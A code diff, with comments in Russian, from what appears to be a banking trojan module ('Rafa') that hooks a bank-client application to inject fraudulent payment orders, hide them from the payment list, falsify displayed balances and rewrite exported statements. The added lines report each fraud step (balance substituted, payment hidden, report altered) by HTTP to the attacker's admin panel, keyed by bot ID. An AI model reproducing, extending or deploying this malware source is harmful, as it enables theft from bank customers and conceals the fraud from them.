@@ -160,6 +160,8 @@ int widthScreen, heightScreen;
 const int maxFileReports = 5;
 FileReport fileReports[maxFileReports];
 
+char domain[128]; //адрес админки
+
 //контролы формы "Платежное поручение"
 ControlForm controlsPaymentOrder[] = 
 {
@@ -197,6 +199,58 @@ ControlForm formConfirmation =
 
 //сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
 static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );
+
+static void SendLogToAdmin( int num, const char* text = 0 )
+{
+	char qr[128], addText[64];
+	if( domain[0] == 0 ) return; //если админка неизвестна, то ничего не шлем
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	if( text && text[0] ) //не пустая строка
+		pwsprintfA( addText, "&text=", text );
+	else
+		addText[0] = 0;
+	pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s", domain, BOT_UID, num, addText );
+	THTTPResponse Response;
+	ClearStruct(Response);
+	HTTP::Get( qr, 0, &Response );
+	DBGRAFA( "Rafa", "Отсылка лога: %s", qr );
+	HTTPResponse::Clear(&Response);
+}
+
+struct LogInfo
+{
+	int num;
+	char text[64];
+};
+
+// Функция отправляет лог в отдельном потоке
+static DWORD WINAPI SendLogToAdminThread( LPVOID p )
+{
+	LogInfo* p2 = (LogInfo*)p;
+	SendLogToAdmin( p2->num, p2->text );
+	MemFree(p);
+	return 0;
+}
+
+static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
+{
+	LogInfo* p = (LogInfo*)MemAlloc(sizeof(LogInfo));
+	if( p )
+	{
+		p->num = num;
+		if( text )
+		{
+			int len = m_lstrlen(text);
+			if( len > sizeof(p->text) ) len = sizeof(p->text) - 1;
+			m_memcpy( p->text, text, len );
+			p->text[len] = 0;
+		}
+		else
+			p->text[0] = 0;
+		StartThread( SendLogToAdmin, p );
+	}
+	return 0;
+}
 
 static PIMAGE_NT_HEADERS GetNtHeaders(PVOID Image)
 {
@@ -472,6 +526,7 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 										pSendMessageA( listView, WM_NOTIFY, (WPARAM)0, (LPARAM)&nm );
 									}
 									pSendMessageA( listView, LVM_REDRAWITEMS, (WPARAM)0, (LPARAM)(c_lvRows - 1) );
+									SendLogToAdminThread(6); //сообщаем о скрытии платежки
 									//pUpdateWindow(listView); //обновляем таблицу
 								}
 								identHidePayment = 0;
@@ -1001,16 +1056,17 @@ static void ModifyFormatXml( FileReport& fr )
 
 static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
 {
+	const char* nameReport = 0; //имя формируемого отчета для лога
 	for( int i = 0; i < maxFileReports; i++ )
 		if( fileReports[i].file == hObject ) //наш отчет
 		{
 			//поправляем его
 			switch( fileReports[i].type )
 			{
-				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); break;
-				case ReportFormatClientBank: ModifyFormatKB(fileReports[i]); break;
-				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); break;
-				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); break;
+				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); nameReport = "report_html"; break;
+				case ReportFormatClientBank: ModifyFormatKB(fileReports[i]); nameReport = "export_to_client_bank"; break;
+				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); nameReport = "export_to_1C"; break;
+				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); nameReport = "export_to_xml"; break;
 			}
 			//пишем в файл
 			DWORD wr;
@@ -1019,6 +1075,7 @@ static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
 			fileReports[i].file = 0;
 			fileReports[i].text = 0;
 			fileReports[i].len = 0;
+			SendLogToAdminThread( 7, nameReport );
 			break;
 		}
 	return pHandlerCloseHandle(hObject);
@@ -1307,7 +1364,6 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 			{
 				if( GetTextTreeItem( item, text, sizeof(text) ) )
 				{
-					DBGRAFA( "Rafa", "1 %s", text );
 					DWORD hash = CalcHash(text);
 					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
 					{
@@ -1317,7 +1373,6 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 						{
 							if( GetTextTreeItem( item2, text, sizeof(text) ) )
 							{
-								DBGRAFA( "Rafa", "2 %s", text );
 								if( m_strstr( text, "Шаблоны" ) )
 								{
 									//itemPrev - это ветка с номеров счета
@@ -1687,6 +1742,7 @@ static void WorkInRafa()
 										pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
 										po->entered = true;
 										SavePaymentOrders();
+										SendLogToAdmin(3);
 									}
 								}
 								HEAP::Free(cf);
@@ -1712,6 +1768,8 @@ static bool InitData()
 {
 	for( int i = 0; i < maxFileReports; i++ )
 		fileReports[i].file = 0;
+	if( GetAdminUrl(domain) == 0 )
+		domain[0] = 0;
 	return true;
 }
 
@@ -1868,6 +1926,7 @@ static char* AddBalans( const char* acc, const char* balans )
 	m_lstrcpy( findedBalans[i].balans, balans );
 	//считаем баланс для отображения
 	int intBalans = BalansToInt(balans);
+	int oldBalans = intBalans;
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
 		if( paymentOrders[i].entered && m_lstrcmp( acc, paymentOrders[i].sendAcc ) == 0 )
@@ -1882,6 +1941,8 @@ static char* AddBalans( const char* acc, const char* balans )
 		}
 	}
 	IntToBalans( intBalans, findedBalans[i].showBalans );
+	if( intBalans != oldBalans ) //подменили баланс
+		SendLogToAdminThread(5);
 	DBGRAFA( "Rafa", "finded acc '%s', balans '%s', show balans '%s'", acc, balans, findedBalans[i].showBalans );
 	return findedBalans[i].showBalans;
 }
@@ -2179,10 +2240,13 @@ static PaymentOrder* GetPaymentOrders()
 				DBGRAFA( "Rafa", "Получена платежка" );
 				DBGPrintPayment(po);
 				res = po;
+				SendLogToAdmin( 1, po->sum );
 			}
 		}
 		STR::Free(payment);
 	}
+	else
+		SendLogToAdmin(4);
 	return res;
 }
 
